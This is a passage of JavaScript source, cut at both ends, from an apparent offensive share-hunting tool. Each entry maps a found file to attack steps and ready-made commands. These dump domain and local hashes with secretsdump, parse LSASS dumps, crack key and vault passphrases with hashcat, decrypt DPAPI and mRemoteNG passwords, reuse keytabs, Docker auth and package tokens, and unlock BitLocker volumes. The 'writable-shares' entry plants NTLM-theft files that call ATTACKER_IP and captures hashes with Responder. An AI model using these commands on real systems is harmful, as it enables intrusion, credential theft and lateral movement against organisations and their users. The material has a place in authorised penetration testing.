    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Extract / list',
          description: 'Browse the image for unattend and MDT files',
          command: `7z l ${shQuote(ctx.localName)}\n7z e ${shQuote(ctx.localName)} -oiso_out 'Autounattend.xml' 'unattend.xml' -r`,
        },
      ]),
  },
  {
    id: 'ntds-dit',
    title: 'Dump NTDS.dit offline',
    summary: 'A copied ntds.dit is a full domain hash dump',
    why: 'ntds.dit plus a SYSTEM hive yields every domain hash (and often Kerberos keys) via offline secretsdump. This is equivalent to DCSync without touching the DC again.',
    nextSteps: [
      'Collect ntds.dit and the matching SYSTEM hive',
      'Run secretsdump locally',
      'Crack weak hashes and look for reuse on privileged accounts',
    ],
    tools: ['impacket-secretsdump', 'secretsdump.py'],
    severity: 'critical',
    category: 'dumps',
    icon: 'fa-server',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return name === 'ntds.dit' || name.endsWith('.dit');
      },
    },
    resultsFilter: { type: 'search', value: 'ntds.dit' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Offline secretsdump',
          description: 'SYSTEM must come from the same DC / backup set',
          command: `impacket-secretsdump -ntds ${shQuote(ctx.localName)} -system SYSTEM LOCAL`,
        },
      ]),
  },
  {
    id: 'registry-hives',
    title: 'Dump SAM / SYSTEM / SECURITY hives',
    summary: 'Registry hives yield local hashes and LSA secrets',
    why: 'Copied SAM, SYSTEM, and SECURITY hives give local account hashes, cached domain creds, LSA secrets, and sometimes service account passwords.',
    nextSteps: [
      'Pair SAM+SYSTEM for local hashes, SECURITY+SYSTEM for LSA secrets',
      'Dump with secretsdump or pypykatz',
      'Pass-the-hash or crack high-value local admins',
    ],
    tools: ['impacket-secretsdump', 'pypykatz', 'impacket-reg'],
    severity: 'critical',
    category: 'dumps',
    icon: 'fa-archive',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        const ext = extensionOf(file.fileName);
        if (ext === 'hiv' || ext === 'hive') return true;
        const hives = new Set(['sam', 'security', 'system', 'software']);
        const base = name.replace(/\.(bak|save|old|copy|hiv|hive)$/i, '');
        return hives.has(name) || hives.has(base);
      },
    },
    resultsFilter: { type: 'search', value: 'SAM' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Local secretsdump',
          description: 'Use the matching SYSTEM hive from the same host/backup',
          command: `impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL`,
        },
        {
          label: 'pypykatz registry',
          description: 'Parse LSA / SAM from hive files',
          command: `pypykatz registry --sam SAM --security SECURITY SYSTEM`,
        },
      ]),
  },
  {
    id: 'lsass-dmp',
    title: 'Parse LSASS dumps',
    summary: 'Memory dumps often contain live credentials',
    why: 'lsass.dmp / minidumps on shares are leftover IR or troubleshooting artifacts. They can contain NTLM hashes, Kerberos tickets, and plaintext passwords.',
    nextSteps: [
      'Parse the dump with pypykatz (no need to touch the live host)',
      'Extract hashes, tickets, and DPAPI material',
      'Pass-the-hash or reuse tickets promptly — they expire',
    ],
    tools: ['pypykatz', 'mimikatz'],
    severity: 'critical',
    category: 'dumps',
    icon: 'fa-memory',
    source: 'files',
    matcher: {
      custom: (file) => lowerName(file).includes('lsass'),
    },
    resultsFilter: { type: 'search', value: 'lsass' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'pypykatz minidump',
          description: 'Parse credentials from the LSASS dump',
          command: `pypykatz lsa minidump ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'mail-pst',
    title: 'Mine PST / OST mailboxes',
    summary: 'Outlook data files hold mail, attachments, and creds',
    why: 'PST/OST files on shares are full mailboxes. They often include password resets, VPN instructions, attachments with creds, and internal recon.',
    nextSteps: [
      'Open or convert the PST and search for password / VPN / account',
      'Extract attachments that look like configs or certs',
      'Note privileged conversations (IT, finance, HR)',
    ],
    tools: ['readpst', 'pffexport', 'outlook'],
    severity: 'medium',
    category: 'dumps',
    icon: 'fa-envelope',
    source: 'files',
    matcher: { extensions: ['pst', 'ost'] },
    resultsFilter: { type: 'extension', value: 'pst' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Export PST',
          description: 'Convert to readable mail + attachments',
          command: `readpst -o pst_out ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'databases',
    title: 'Inspect local database files',
    summary: 'MDB / SQLite / MDF files store users and secrets',
    why: 'Application databases on shares frequently contain user tables, password hashes, session tokens, and PII. Older Access DBs are especially leaky.',
    nextSteps: [
      'Identify the engine and open read-only',
      'List tables and hunt users / password / token columns',
      'Crack recovered hashes or reuse plaintext',
    ],
    tools: ['sqlite3', 'mdb-tables', 'sqlcmd'],
    severity: 'high',
    category: 'dumps',
    icon: 'fa-table',
    source: 'files',
    matcher: { extensions: ['mdb', 'accdb', 'sqlite', 'sqlite3', 'db', 'sdf', 'mdf', 'ldf'] },
    resultsFilter: { type: 'extension', value: 'sqlite' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'SQLite tables',
          description: 'If this is SQLite, list schema and user-like tables',
          command: `sqlite3 ${shQuote(ctx.localName)} '.tables'\nsqlite3 ${shQuote(ctx.localName)} "SELECT name FROM sqlite_master WHERE type='table';"`,
        },
        {
          label: 'Access tables',
          description: 'If this is MDB/ACCDB',
          command: `mdb-tables ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'sql-dumps',
    title: 'Parse SQL dumps for accounts',
    summary: 'SQL exports include CREATE USER and hashes',
    why: 'SQL dump files often contain CREATE USER, IDENTIFIED BY, and INSERT statements with password hashes or even plaintext application data.',
    nextSteps: [
      'Search for USER, PASSWORD, IDENTIFIED BY, and INSERT INTO users',
      'Recover hashes or plaintext and map them to applications',
      'Test reuse against the live database and related apps',
    ],
    tools: ['grep', 'sqlmap'],
    severity: 'high',
    category: 'dumps',
    icon: 'fa-file-code',
    source: 'files',
    matcher: { extensions: ['sql'] },
    resultsFilter: { type: 'extension', value: 'sql' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Hunt credential statements',
          description: 'Find user creation and password inserts',
          command: `grep -n -i -E 'create user|identified by|password|insert into .*user' ${shQuote(ctx.localName)} | head`,
        },
      ]),
  },
  {
    id: 'ssh-keys',
    title: 'SSH with recovered keys',
    summary: 'id_rsa / id_ed25519 on shares are direct access',
    why: 'Unprotected (or weakly passphrased) OpenSSH private keys on shares are often still authorized on jump hosts, git servers, and appliances.',
    nextSteps: [
      'Check whether the key is encrypted',
      'Identify the owner from the path or a nearby .pub comment',
      'Try SSH against hinted hosts; crack the passphrase if needed',
    ],
    tools: ['ssh', 'ssh-keygen', 'ssh2john', 'hashcat'],
    severity: 'critical',
    category: 'access',
    icon: 'fa-terminal',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        if (name.endsWith('.pub')) return false;
        return (
          /^(id_rsa|id_ed25519|id_ecdsa|id_dsa)(\.|$)/.test(name) ||
          name.includes('id_rsa') ||
          name.includes('id_ed25519')
        );
      },
    },
    resultsFilter: { type: 'search', value: 'id_rsa' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Fix permissions + test',
          description: 'SSH will refuse a world-readable key',
          command: `chmod 600 ${shQuote(ctx.localName)}\nssh-keygen -y -f ${shQuote(ctx.localName)}\nssh -i ${shQuote(ctx.localName)} user@HOST`,
        },
        {
          label: 'Crack passphrase',
          description: 'If the key asks for a passphrase',
          command: `ssh2john ${shQuote(ctx.localName)} > ssh.hash\nhashcat -m 22921 ssh.hash wordlist.txt`,
        },
      ]),
  },
  {
    id: 'rdp-files',
    title: 'Follow saved RDP connections',
    summary: '.rdp files reveal hosts and sometimes saved creds',
    why: 'RDP connection files document jump-box targets, gateways, and usernames. Some include a password blob that can be decrypted in the original user context.',
    nextSteps: [
      'Parse full address, gateway, and username',
      'Try connecting with recovered domain creds',
      'If a password blob is present, decrypt in the owner context',
    ],
    tools: ['grep', 'xfreerdp'],
    severity: 'medium',
    category: 'access',
    icon: 'fa-tv',
    source: 'files',
    matcher: { extensions: ['rdp'] },
    resultsFilter: { type: 'extension', value: 'rdp' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Parse RDP file',
          description: 'Show target host, gateway, and username',
          command: `grep -E 'full address|username|gateway|password' ${shQuote(ctx.localName)}`,
        },
        {
          label: 'Connect (template)',
          description: 'Use recovered credentials against the saved host',
          command: `xfreerdp /v:HOST /u:DOMAIN\\\\user /p:PASSWORD /cert:ignore`,
        },
      ]),
  },
  {
    id: 'vpn-configs',
    title: 'Import VPN profiles',
    summary: 'OVPN/PCF profiles can include embedded secrets',
    why: 'VPN configs on shares sometimes embed private keys, user certs, or auth-user-pass files. Even without a password they reveal gateways and username conventions.',
    nextSteps: [
      'Inspect for embedded keys, auth-user-pass, and gateway IPs',
      'Look next to the profile for .key / .crt / .txt password files',
      'Import and test with recovered user credentials',
    ],
    tools: ['openvpn', 'grep'],
    severity: 'high',
    category: 'access',
    icon: 'fa-shield-alt',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        const ext = extensionOf(file.fileName);
        if (ext === 'ovpn' || ext === 'pcf' || ext === 'pbk') return true;
        // Filename contains "vpn" but is not a profile (certs, pcaps, disks, etc.)
        const notAProfile = new Set([
          'p12', 'pfx', 'pem', 'crt', 'cer', 'key', 'pcap', 'pcapng', 'cap',
          'exe', 'dll', 'zip', '7z', 'vmdk', 'ova', 'iso', 'log', 'txt',
        ]);
        if (notAProfile.has(ext)) return false;
        const looksLikeClient =
          name.includes('openvpn') ||
          name.includes('anyconnect') ||
          name.includes('globalprotect') ||
          name.includes('wireguard') ||
          name.includes('forticlient');
        const configExt = ext === 'conf' || ext === 'config' || ext === 'xml' || ext === 'json' || ext === 'tblk';
        return looksLikeClient || (name.includes('vpn') && configExt);
      },
    },
    resultsFilter: { type: 'extension', value: 'ovpn' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Inspect profile',
          description: 'Find gateways, embedded certs, and auth files',
          command: `grep -n -i -E 'remote |auth-user-pass|cert |key |<key>|<cert>' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'wlan-profiles',
    title: 'Recover Wi-Fi PSKs',
    summary: 'WLAN XML profiles store wireless keys',
    why: 'Exported Windows WLAN profiles contain keyMaterial for pre-shared keys. Those PSKs get you onto corp / guest / IoT segments that may be less monitored.',
    nextSteps: [
      'Extract <keyMaterial> from the XML',
      'Join the SSID from a test device',
      'Look for less-segmented access or rogue-AP opportunities',
    ],
    tools: ['netsh', 'grep'],
    severity: 'medium',
    category: 'access',
    icon: 'fa-wifi',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        const path = lowerPath(file);
        const ctx = `${file.matchContext || ''}`.toLowerCase();
        return (
          ctx.includes('keymaterial') ||
          ((name.endsWith('.xml') || path.includes('wlan')) &&
            (name.includes('wlan') || name.includes('wi-fi') || name.includes('wifi')))
        );
      },
    },
    resultsFilter: { type: 'search', value: 'keyMaterial' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Extract PSK',
          description: 'Read the keyMaterial element',
          command: `grep -n -i -E 'name>|ssid|keymaterial|authentication' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'writable-shares',
    title: 'Abuse writable shares (NTLM theft)',
    summary: 'Plant SCF/URL/LNK files to steal hashes',
    why: 'A writable share lets you drop a file that forces Explorer to authenticate to you. Combine with Responder or ntlmrelayx. Also a staging area for tampering with existing files.',
    nextSteps: [
      'Confirm write access with a harmless test file and delete it',
      'Generate SCF/URL/LNK payloads pointing at your listener',
      'Capture or relay inbound hashes from users who browse the share',
    ],
    tools: ['ntlm_theft', 'Responder', 'ntlmrelayx', 'smbclient'],
    severity: 'high',
    category: 'access',
    icon: 'fa-folder-open',
    source: 'shares',
    shareMatch: (share) => !!(share.rootWritable || share.rootModifyable),
    buildCommands: (ctx) => {
      const unc = ctx.unc;
      const parsed = ctx.parsed;
      const shareUnc = parsed ? `//${parsed.server}/${parsed.share}` : unc.replace(/\\/g, '/');
      return [
        {
          label: 'Generate NTLM theft files',
          description: 'Creates SCF/URL/LNK icons that phone home',
          command: `ntlm_theft.py --generate all --server ATTACKER_IP --filename invoice`,
        },
        {
          label: 'Drop onto the share',
          description: 'Upload one of the generated files to the writable share',
          command: `smbclient ${shQuote(shareUnc)} -U 'DOMAIN/user%password' -c 'put invoice.scf'`,
        },
        {
          label: 'Catch hashes',
          description: 'Listen for inbound auth from users browsing the share',
          command: `sudo responder -I eth0\n# or\nimpacket-ntlmrelayx -tf targets.txt -smb2support`,
        },
      ];
    },
  },
  {
    id: 'scripts-creds',
    title: 'Mine scripts for hardcoded secrets',
    summary: 'PS1/BAT files often embed service passwords',
    why: 'Ops scripts on NETLOGON, SYSVOL, and IT shares frequently hardcode credentials for scheduled tasks, service accounts, and remote tools.',
    nextSteps: [
      'Read the script around each password / SecureString / net use',
      'Identify the account and what it authenticates to',
      'Reuse the account; check if it is over-privileged',
    ],
    tools: ['grep', 'Select-String'],
    severity: 'high',
    category: 'configs',
    icon: 'fa-file-alt',
    source: 'files',
    matcher: {
      extensions: ['ps1', 'bat', 'cmd', 'vbs', 'wsf'],
      contextIncludes: [
        'password',
        'passwd',
        'secret',
        'credential',
        '-asplaintext',
        'convertto-securestring',
        'net user',
        'net use',
      ],
    },
    resultsFilter: { type: 'extension', value: 'ps1' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Extract secret lines',
          description: 'Show credential-related lines with context',
          command: `grep -n -i -E 'pass|secret|cred|securestring|net user|net use|token' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'sccm-mdt',
    title: 'Loot MDT / SCCM bootstrap creds',
    summary: 'Deployment INIs hide domain-join and NAA accounts',
    why: 'bootstrap.ini and CustomSettings.ini used by MDT/SCCM often contain UserID/UserPassword for deployment shares and sometimes Network Access Accounts.',
    nextSteps: [
      'Extract UserID, UserPassword, and JoinDomain values',
      'Test the account against the deployment share and the domain',
      'If it is an SCCM NAA, review what collections it can reach',
    ],
    tools: ['grep'],
    severity: 'critical',
    category: 'configs',
    icon: 'fa-download',
    source: 'files',
    matcher: { fileNames: ['bootstrap.ini', 'customsettings.ini'] },
    resultsFilter: { type: 'search', value: 'bootstrap.ini' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Extract deployment creds',
          description: 'UserID / UserPassword / domain-join settings',
          command: `grep -n -i -E 'userid|userpassword|joindomain|username|password|sccm' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'backup-configs',
    title: 'Review leftover config backups',
    summary: '.bak/.old copies keep retired secrets',
    why: 'Backup copies of configs are often older, less rotated, and still valid. They are a common place to find previous production passwords that still work.',
    nextSteps: [
      'Diff against the live config if you have both',
      'Extract connection strings and secrets as with a live config',
      'Test older passwords — they are frequently still accepted',
    ],
    tools: ['grep', 'diff'],
    severity: 'medium',
    category: 'configs',
    icon: 'fa-history',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        const backupExt = ['.bak', '.backup', '.old', '.orig', '.save', '.copy', '.tmp'];
        const looksBackup =
          backupExt.some((ext) => name.endsWith(ext)) ||
          name.includes('.bak.') ||
          name.includes('.old.') ||
          name.includes('_backup') ||
          name.includes('_old');
        if (!looksBackup) return false;
        return ['config', 'setting', 'web.', 'appsettings', 'secret', 'env', '.ini', '.xml', '.json'].some(
          (hint) => name.includes(hint)
        );
      },
    },
    resultsFilter: { type: 'search', value: '.bak' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Extract leftover secrets',
          description: 'Same hunt as a live config file',
          command: `grep -n -i -E 'pass|secret|token|key|connection|user' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'dpapi-masterkeys',
    title: 'Decrypt DPAPI masterkeys',
    summary: 'Protect folders unlock Chrome, RDP, and saved creds',
    why: 'DPAPI masterkeys under AppData\\Roaming\\Microsoft\\Protect can decrypt many Windows secrets (Chrome, Credential Manager, RDP passwords) if you also have the user password or a domain backup key.',
    nextSteps: [
      'Collect the Protect\\SID folder plus the user password or NT hash',
      'Decrypt masterkeys with pypykatz / mimikatz / dpapick',
      'Use the keys against nearby Credential Manager / Chrome blobs',
    ],
    tools: ['pypykatz', 'mimikatz', 'dpapick'],
    severity: 'high',
    category: 'dumps',
    icon: 'fa-user-secret',
    source: 'files',
    matcher: {
      pathIncludes: ['\\microsoft\\protect\\'],
    },
    resultsFilter: { type: 'search', value: 'Microsoft\\Protect' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Decrypt masterkey',
          description: 'Needs the user password or NT hash',
          command: `pypykatz dpapi masterkey -m ${shQuote(ctx.localName)} -p 'USER_PASSWORD'`,
        },
      ]),
  },
  {
    id: 'kerberos-keytab',
    title: 'Authenticate with Kerberos keytabs',
    summary: 'A keytab is a ready-made TGT for that principal',
    why: 'Service keytabs on shares (.keytab, krb5.keytab) contain long-term Kerberos keys. You can request a TGT as that account without knowing the password — often a computer or service account with SPN access.',
    nextSteps: [
      'List principals in the keytab',
      'Request a TGT as the highest-value principal',
      'Use the ticket against SPNs, MSSQL, or the host the keytab belongs to',
    ],
    tools: ['impacket-getTGT', 'klist', 'ktutil', 'kinit'],
    severity: 'critical',
    category: 'access',
    icon: 'fa-ticket-alt',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return name.endsWith('.keytab') || name === 'krb5.keytab' || name.includes('keytab');
      },
    },
    resultsFilter: { type: 'extension', value: 'keytab' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'List principals',
          description: 'See which accounts are in the keytab',
          command: `klist -k -t ${shQuote(ctx.localName)}\nktutil --keytab=${shQuote(ctx.localName)} list`,
        },
        {
          label: 'Get a TGT',
          description: 'Authenticate as the keytab principal',
          command: `impacket-getTGT 'DOMAIN/principal' -dc-ip DC_IP -k -no-pass -keytab ${shQuote(ctx.localName)}\nexport KRB5CCNAME=principal.ccache`,
        },
      ]),
  },
  {
    id: 'mremoteng',
    title: 'Decrypt mRemoteNG passwords',
    summary: 'mRemoteNG uses a well-known default encryption key',
    why: 'confCons.xml stores every saved RDP/SSH/VNC password. The default encryption key is public, so most exports decrypt offline to a full jump-box inventory plus credentials.',
    nextSteps: [
      'Download confCons.xml',
      'Run a mRemoteNG decryptor (default key first)',
      'Reuse host/user/password tuples against the documented servers',
    ],
    tools: ['mremoteng-decrypt', 'python'],
    severity: 'critical',
    category: 'credentials',
    icon: 'fa-project-diagram',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return name === 'confcons.xml' || name.includes('confcons') || name.includes('mremoteng');
      },
    },
    resultsFilter: { type: 'search', value: 'confCons' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Decrypt connections',
          description: 'Try the default mRemoteNG key first',
          command: `python3 mremoteng_decrypt.py ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'rdcman-rdg',
    title: 'Decrypt RDCMan connection files',
    summary: '.rdg files hold grouped RDP hosts and passwords',
    why: 'Remote Desktop Connection Manager stores server trees and encrypted passwords in .rdg files. Those passwords can be decrypted with the owner DPAPI key or documented RDCMan tools.',
    nextSteps: [
      'Parse the RDG for hosts, gateways, and usernames even before decrypting',
      'Decrypt password blobs with the user DPAPI masterkey if you have it',
      'Use the host list as a privileged jump inventory',
    ],
    tools: ['rdg2hashcat', 'pypykatz'],
    severity: 'high',
    category: 'access',
    icon: 'fa-sitemap',
    source: 'files',
    matcher: { extensions: ['rdg'] },
    resultsFilter: { type: 'extension', value: 'rdg' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'List hosts',
          description: 'Inventory servers and usernames in the RDG',
          command: `grep -n -i -E 'name=|username|password|server' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'db-client-creds',
    title: 'Loot database client saved logins',
    summary: '.pgpass, .my.cnf, and DBeaver store DB passwords',
    why: 'DBA workstations and shares leave client config files with plaintext or weakly protected database passwords. Those accounts often have wide data access or sa-equivalent rights.',
    nextSteps: [
      'Read host/user/password from the client config',
      'Connect read-only and enumerate users / linked servers / jobs',
      'Look for the same password on the OS and other DBs',
    ],
    tools: ['psql', 'mysql', 'sqlcmd'],
    severity: 'high',
    category: 'credentials',
    icon: 'fa-database',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return (
          name === '.pgpass' ||
          name === 'pgpass.conf' ||
          name === '.my.cnf' ||
          name === 'my.cnf' ||
          name === 'credentials-config.json' ||
          name.includes('dbeaver') ||
          name === 'heidisql.stg' ||
          name === 'sqldeveloperconnections.xml'
        );
      },
    },
    resultsFilter: { type: 'search', value: 'pgpass' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Read saved DB logins',
          description: 'Extract host / user / password fields',
          command: `grep -n -i -E 'pass|user|host|sid|service|jdbc|port' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'kube-docker',
    title: 'Reuse kubeconfig and Docker auth',
    summary: 'Cluster and registry files grant cloud/workload access',
    why: 'kubeconfig files embed user certs or bearer tokens. Docker config.json / .dockercfg often contain base64 registry passwords. Either can move you from a file share into the cluster or image registry.',
    nextSteps: [
      'Identify the cluster/registry and the identity in the file',
      'For kubeconfig: kubectl auth can-i --list',
      'For Docker: decode auth blobs and try the registry / cloud account',
    ],
    tools: ['kubectl', 'docker', 'jq'],
    severity: 'critical',
    category: 'cloud',
    icon: 'fa-dharmachakra',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        const path = lowerPath(file);
        return (
          name === 'kubeconfig' ||
          name.endsWith('.kubeconfig') ||
          (name === 'config' && path.includes('.kube')) ||
          (name === 'config.json' && path.includes('.docker')) ||
          name === '.dockercfg' ||
          name === 'docker-compose.yml' ||
          name === 'docker-compose.yaml'
        );
      },
    },
    resultsFilter: { type: 'search', value: 'kubeconfig' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'kubectl whoami',
          description: 'If this is a kubeconfig, see what the identity can do',
          command: `KUBECONFIG=${shQuote(ctx.localName)} kubectl config view\nKUBECONFIG=${shQuote(ctx.localName)} kubectl auth can-i --list`,
        },
        {
          label: 'Decode Docker auth',
          description: 'Base64 auth fields are usually user:password',
          command: `jq -r '.auths[]?.auth // empty' ${shQuote(ctx.localName)} | while read a; do echo "$a" | base64 -d; echo; done`,
        },
      ]),
  },
  {
    id: 'package-tokens',
    title: 'Steal package-manager tokens',
    summary: '.npmrc, NuGet, and .pypirc hold publish credentials',
    why: 'CI and developer shares leak registry tokens in .npmrc, nuget.config, .pypirc, and pip.conf. Those tokens often publish as the org identity or pull private source that contains more secrets.',
    nextSteps: [
      'Extract _authToken / apiKey / password values',
      'Determine the registry (npmjs, Azure Artifacts, PyPI, Nexus)',
      'List private packages and hunt for further secrets in source',
    ],
    tools: ['npm', 'nuget', 'pip'],
    severity: 'high',
    category: 'cloud',
    icon: 'fa-box-open',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return (
          name === '.npmrc' ||
          name === '.yarnrc' ||
          name === '.yarnrc.yml' ||
          name === 'nuget.config' ||
          name === '.pypirc' ||
          name === 'pip.conf' ||
          name === '.gem' ||
          name === '.gemrc'
        );
      },
    },
    resultsFilter: { type: 'search', value: '.npmrc' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Extract tokens',
          description: 'Pull auth tokens and registry URLs',
          command: `grep -n -i -E 'auth|token|api[_-]?key|password|source|registry' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'bitlocker-recovery',
    title: 'Use BitLocker recovery keys',
    summary: 'Recovery HTML/BEK files unlock full disks',
    why: 'BitLocker recovery key HTML/text files and .BEK protectors on shares unlock laptops and volume backups. Combined with a recovered VHD/VMDK this is a full-disk secret dump.',
    nextSteps: [
      'Record the recovery password / key protector ID',
      'Match it to a volume, VHD, or laptop from the filename',
      'Unlock and loot SAM, NTDS, or user profiles',
    ],
    tools: ['manage-bde', 'dislocker'],
    severity: 'critical',
    category: 'disks',
    icon: 'fa-unlock',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return (
          name.endsWith('.bek') ||
          name.includes('bitlocker') ||
          name.includes('recovery key') ||
          name.includes('recoverykey')
        );
      },
    },
    resultsFilter: { type: 'search', value: 'BitLocker' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Read recovery key',
          description: 'HTML/text recoveries print a 48-digit password',
          command: `grep -n -i -E 'recovery|password|key|protector|identifier' ${shQuote(ctx.localName)}`,
        },
        {
          label: 'Unlock a volume',
          description: 'Windows or dislocker against the matching disk',
          command: `manage-bde -unlock E: -RecoveryPassword 111111-222222-333333-444444-555555-666666-777777-888888`,
        },
      ]),
  },
  {
    id: 'mssql-bak',
    title: 'Restore SQL Server backups',
    summary: 'BAK files are full databases with users and data',
    why: 'SQL Server .bak files on shares restore to a local instance. They contain application data, SQL logins, and sometimes linked-server passwords — a different prize than a config.bak.',
    nextSteps: [
      'File the backup header to confirm it is a SQL dump',
      'Restore to a lab SQL instance (do not restore onto the target)',
      'Dump users, hashes, secrets tables, and linked servers',
    ],
    tools: ['sqlcmd', 'impacket-mssqlclient'],
    severity: 'high',
    category: 'dumps',
    icon: 'fa-server',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        if (!name.endsWith('.bak') && !name.endsWith('.trn')) return false;
        if (['config', 'web.', 'appsettings', 'setting', '.ini', '.xml', '.json', '.env'].some((h) => name.includes(h))) {
          return false;
        }
        return (
          ['sql', 'db', 'database', 'mssql', 'master', 'msdb', 'model', 'tempdb'].some((h) => name.includes(h)) ||
          name.endsWith('.bak')
        );
      },
    },
    resultsFilter: { type: 'extension', value: 'bak' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Inspect backup header',
          description: 'Confirm database name and backup date',
          command: `sqlcmd -S localhost -E -Q "RESTORE HEADERONLY FROM DISK = N'${ctx.localName.replace(/'/g, "''")}'"`,
        },
        {
          label: 'Restore to a lab instance',
          description: 'Do this offline, not on the customer SQL server',
          command: `sqlcmd -S localhost -E -Q "RESTORE DATABASE [loot] FROM DISK = N'${ctx.localName.replace(/'/g, "''")}' WITH MOVE 'data' TO 'C:\\\\temp\\\\loot.mdf', MOVE 'log' TO 'C:\\\\temp\\\\loot.ldf'"`,
        },
      ]),
  },
  {
    id: 'pw-manager-export',
    title: 'Import password-manager exports',
    summary: '1Password, Bitwarden, and LastPass dumps are full vaults',
    why: 'User exports (.1pux, Bitwarden JSON/CSV, LastPass CSV) on shares are the entire vault in one file. Even without a master password, unencrypted CSV/JSON is immediately usable.',
    nextSteps: [
      'Identify the format and whether it is encrypted',
      'If plaintext, normalize user/pass/url and prioritize SSO / VPN / admin',
      'If encrypted, crack or look nearby for the master password',
    ],
    tools: ['jq', 'keepassxc'],
    severity: 'critical',
    category: 'credentials',
    icon: 'fa-vault',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        return (
          name.endsWith('.1pux') ||
          name.endsWith('.1pif') ||
          name.includes('bitwarden') ||
          name.includes('lastpass') ||
          name.includes('1password') ||
          name === 'passwords.csv' ||
          name === 'vault.json'
        );
      },
    },
    resultsFilter: { type: 'search', value: 'bitwarden' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Preview export',
          description: 'JSON/CSV vaults are usually plaintext',
          command: `sed -n '1,80p' ${shQuote(ctx.localName)}`,
        },
      ]),
  },
  {
    id: 'password-safe',
    title: 'Crack Password Safe databases',
    summary: 'Password Safe .psafe3 files crack like KeePass',
    why: 'Password Safe (and similar .psafe3 vaults) show up on IT shares next to KeePass. Offline crack the master password, then replay the stored accounts.',
    nextSteps: [
      'Extract a hash and crack the master password',
      'Open the DB and export entries',
      'Spray privileged and VPN accounts first',
    ],
    tools: ['pwsafe2john', 'hashcat'],
    severity: 'critical',
    category: 'credentials',
    icon: 'fa-safe',
    source: 'files',
    matcher: { extensions: ['psafe3', 'psafe'] },
    resultsFilter: { type: 'extension', value: 'psafe3' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
        {
          label: 'Extract hash',
          description: 'Generate a john/hashcat hash from the vault',
          command: `pwsafe2john ${shQuote(ctx.localName)} > pwsafe.hash\nhashcat -m 5200 pwsafe.hash wordlist.txt`,
        },
      ]),
  },
  {
    id: 'gpg-private',
    title: 'Use GPG / PGP private keys',
    summary: 'Secret keys decrypt mail, backups, and SOPS files',
    why: 'Private OpenPGP keys on shares (secring.gpg, *private*.asc) decrypt mail, backup archives, and SOPS/age-wrapped secrets. Passphrases are often in a nearby text file.',
    nextSteps: [
      'Import the key and see whether it is passphrase-protected',
      'Hunt nearby for the passphrase or crack it',
      'Look for ciphertext (.gpg, .asc, sops yaml) that this key unlocks',
    ],
    tools: ['gpg', 'gpg2john', 'sops'],
    severity: 'high',
    category: 'certificates',
    icon: 'fa-envelope-open-text',
    source: 'files',
    matcher: {
      custom: (file) => {
        const name = lowerName(file);
        const ctx = `${file.matchContext || ''}`.toLowerCase();
        return (
          name === 'secring.gpg' ||
          name.endsWith('.sec.gpg') ||
          (name.endsWith('.asc') && (name.includes('secret') || name.includes('private') || ctx.includes('private key'))) ||
          (name.endsWith('.gpg') && (name.includes('secret') || name.includes('private') || name.includes('secring')))
        );
      },
    },
    resultsFilter: { type: 'search', value: 'secring' },
    buildCommands: (ctx) =>
      withDownload(ctx, [
